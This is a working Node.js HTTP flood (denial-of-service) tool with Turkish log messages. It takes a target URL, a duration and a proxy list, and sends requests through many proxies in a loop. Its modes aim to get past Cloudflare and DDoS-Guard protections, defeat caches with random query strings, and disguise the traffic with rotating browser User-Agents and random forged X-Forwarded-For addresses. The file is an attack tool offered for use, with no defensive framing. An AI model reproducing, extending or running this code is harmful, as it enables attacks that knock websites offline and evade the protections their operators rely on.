const fs = require('fs');
const colors = require('colors');
const axios = require('axios');
const cloudscraper = require('cloudscraper');
const HttpsProxyAgent = require('https-proxy-agent');

const args = process.argv.slice(2);
const target = args[0] || 'https://example.com';
const duration = parseInt(args[1]) || 60;
const mode = args[2] || 'cf';
const proxyFile = args[3] || 'proxies.txt';

let attackCount = 0;
let successCount = 0;
let failCount = 0;
let totalProxies = 0;

function log(message, color = 'white') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    console.log(`[${timestamp}] ${colors[color] ? colors[color](message) : message}`);
}

function getRandomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function readProxies(filePath) {
    try {
        const proxies = fs.readFileSync(filePath, 'utf-8').split('\n').map(p => p.trim()).filter(Boolean);
        log(`📑 ${proxies.length} proxy yüklendi.`, 'yellow');
        return proxies;
    } catch (err) {
        log(`❌ Proxy dosyası okunamadı: ${err.message}`, 'red');
        return [];
    }
}

async function checkProxies(proxies) {
    log('🔍 Proxy\'ler kontrol ediliyor...', 'yellow');
    const working = [];
    const promises = proxies.map(async (proxy) => {
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            const response = await axios.get('https://httpbin.org/ip', {
                httpsAgent: agent,
                timeout: 3000,
                validateStatus: () => true
            });
            if (response.status === 200) {
                working.push(proxy);
                log(`✅ Proxy ${proxy} çalışıyor.`, 'green');
            } else {
                log(`❌ Proxy ${proxy} çalışmıyor (Status: ${response.status}).`, 'red');
            }
        } catch (e) {
            log(`❌ Proxy ${proxy} hata verdi: ${e.message}`, 'red');
        }
    });

    await Promise.all(promises);
    totalProxies = working.length;
    log(`✅ Toplam ${working.length} çalışan proxy bulundu.`, 'green');
    return working;
}

function startPanel() {
    const startTime = Date.now();
    const interval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const left = duration - elapsed;
        if (elapsed >= duration) {
            clearInterval(interval);
            log(`🏁 Saldırı tamamlandı! Toplam: ${attackCount} | Başarılı: ${successCount} | Başarısız: ${failCount}`, 'green');
            process.exit(0);
        }
        log(`[⏱️ ${elapsed}s/${duration}s] Mod: ${mode.toUpperCase()} | Aktif: ${attackCount} | Başarılı: ${successCount} | Başarısız: ${failCount} | Proxy: ${totalProxies}`, 'cyan');
    }, 3000);
}

function fakeHeaders() {
    const browsers = [
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.${Math.floor(Math.random() * 500)}.100 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0`
    ];
    return {
        'User-Agent': browsers[Math.floor(Math.random() * browsers.length)],
        'Referer': `https://www.google.com/search?q=${Math.random().toString(36).substring(2)}`,
        'X-Forwarded-For': getRandomIP(),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5'
    };
}

const methods = {
    cf: async (url, proxy) => {
        try {
            await cloudscraper.get({ uri: url, proxy: `http://${proxy}`, headers: fakeHeaders() });
            attackCount++;
            successCount++;
            log(`✅ [CF] ${url} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [CF] ${url} -> Hata: ${e.message}`, 'red');
        }
    },
    head: async (url, proxy) => {
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            await axios.head(url, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
            attackCount++;
            successCount++;
            log(`✅ [HEAD] ${url} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [HEAD] ${url} -> Hata: ${e.message}`, 'red');
        }
    },
    poison: async (url, proxy) => {
        const rand = Math.random().toString(36).substring(2);
        const fullUrl = `${url}?cb=${rand}`;
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            await axios.get(fullUrl, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
            attackCount++;
            successCount++;
            log(`✅ [POISON] ${fullUrl} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [POISON] ${fullUrl} -> Hata: ${e.message}`, 'red');
        }
    },
    ddg: async (url, proxy) => {
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            await axios.get(url, {
                headers: {
                    ...fakeHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 DDoSGuardCheck/2.0',
                    'Referer': 'https://www.google.com/'
                },
                httpsAgent: agent,
                timeout: 5000
            });
            attackCount++;
            successCount++;
            log(`✅ [DDG] ${url} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [DDG] ${url} -> Hata: ${e.message}`, 'red');
        }
    },
    autoProxy: async (url, proxy) => {
        const rand = Math.random().toString(36).substring(2);
        const fullUrl = `${url}?cachebust=${rand}`;
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            await axios.get(fullUrl, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
            attackCount++;
            successCount++;
            log(`✅ [AUTO] ${fullUrl} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [AUTO] ${fullUrl} -> Hata: ${e.message}`, 'red');
        }
    },
    bypass: async (url, proxy) => {
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            await axios.get(url, {
                headers: {
                    ...fakeHeaders(),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive'
                },
                httpsAgent: agent,
                timeout: 5000
            });
            attackCount++;
            successCount++;
            log(`✅ [BYPASS] ${url} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [BYPASS] ${url} -> Hata: ${e.message}`, 'red');
        }
    },
    flood: async (url, proxy) => {
        const rand = Math.random().toString(36).substring(2);
        const fullUrl = `${url}?flood=${rand}`;
        try {
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            await axios.get(fullUrl, {
                headers: {
                    ...fakeHeaders(),
                    'Connection': 'keep-alive'
                },
                httpsAgent: agent,
                timeout: 5000
            });
            attackCount++;
            successCount++;
            log(`✅ [FLOOD] ${fullUrl} -> Başarılı`, 'green');
        } catch (e) {
            failCount++;
            log(`❌ [FLOOD] ${fullUrl} -> Hata: ${e.message}`, 'red');
        }
    }
};

async function startAttackLoop(proxies, methodName) {
    const end = Date.now() + duration * 1000;
    const method = methods[methodName];
    if (!method) {
        log(`❌ Geçersiz mod: ${methodName}`, 'red');
        return;
    }

    async function attack(proxy) {
        if (Date.now() > end) return;
        await method(target, proxy);
        setTimeout(() => attack(proxy), 100);
    }

    for (const proxy of proxies) {
        attack(proxy);
    }
}

(async () => {
    log(`🎯 Hedef: ${target} | Süre: ${duration}s | Mod: ${mode} | Proxy Dosyası: ${proxyFile}`, 'green');
    if (!fs.existsSync(proxyFile)) {
        log(`❌ Proxy dosyası bulunamadı: ${proxyFile}`, 'red');
        return;
    }
    const proxies = readProxies(proxyFile);
    if (!proxies.length) {
        log('❌ Hiç proxy bulunamadı!', 'red');
        return;
    }
    const workingProxies = await checkProxies(proxies);
    if (!workingProxies.length) {
        log('❌ Hiçbir çalışan proxy bulunamadı!', 'red');
        return;
    }
    startPanel();
    startAttackLoop(workingProxies, mode);
})();